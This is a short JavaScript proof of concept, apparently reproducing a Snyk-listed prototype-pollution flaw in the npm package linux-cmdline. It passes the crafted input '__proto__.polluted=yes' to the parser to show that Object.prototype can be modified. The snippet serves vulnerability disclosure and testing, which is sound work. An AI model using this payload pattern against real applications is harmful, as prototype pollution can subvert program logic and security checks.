//https://snyk.io/vuln/SNYK-JS-LINUXCMDLINE-598674
  const linuxCmdline = require("linux-cmdline");
  linuxCmdline("__proto__.polluted=yes");
